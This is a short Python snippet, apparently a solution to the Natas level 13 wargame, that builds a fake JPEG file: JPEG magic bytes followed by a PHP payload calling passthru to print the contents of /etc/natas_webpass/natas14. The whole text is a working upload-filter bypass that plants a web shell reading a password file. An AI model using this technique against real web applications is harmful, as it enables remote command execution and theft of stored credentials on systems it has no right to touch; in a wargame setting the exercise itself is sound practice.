shell=open('natas13.jpeg','wb')
shell.write(b'\xFF\xD8\xFF\xE0'+b"<?php passthru('cat /etc/natas_webpass/natas14');")
shell.close()
